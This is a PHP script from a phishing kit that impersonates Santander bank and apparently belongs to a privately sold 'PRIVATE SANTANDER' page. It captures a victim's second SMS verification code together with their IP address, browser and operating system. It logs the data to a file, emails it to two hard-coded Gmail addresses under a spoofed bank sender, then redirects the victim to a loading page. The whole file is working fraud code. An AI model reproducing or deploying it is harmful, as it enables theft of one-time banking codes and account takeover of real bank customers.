<?php
/*
___________.____    ._________________________
\_   _____/|    |   |   \__    ___/\_   _____/
 |    __)_ |    |   |   | |    |    |    __)_ 
 |        \|    |___|   | |    |    |        \
/_______  /|_______ \___| |____|   /_______  /
        \/         \/                      \/ ADEMƠ
        ||PRIVATE S|A|N|T|A|N|D|E|R 
        ||Bzef Del'☕ ®RESERVED TO: ADEMƠ (kIllUASHk|SHk001)
*/
session_start();
include("../HOSTER.php"); 
include("blocker.php");
include("detect.php");

$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
include("../SHkIllUA.php"); 

$msg="|+ SMS-2(SANTANDER)\r\n";
$msg.="==================================================\r\n";
$msg.="[+] Sms 2 : {$_POST['SMSERROR']}\r\n";
$msg.="==============================\r\n";
$msg.="[+] localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
$msg.="[+] BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
$msg.="\r\n";
$msg.="\r\n";
$save=fopen("../top-up.txt","a+");fwrite($save,$msg);fclose($save);
$email="bijigo.sa@gmail.com,wwow9290@gmail.com"; //HERE
$subject="SMS-2(SANTANDER) =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
$headers="From: OVX™<SANTANDERBANk@moneySquad.org>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$msg,$headers);


$file_pointer = "id.txt";  
   
// Use unlink() function to delete a file  
if (!unlink($file_pointer)) {  
     
}  
else {  
      
}  
            session_destroy();
            header("location: ../../loading.php");
?>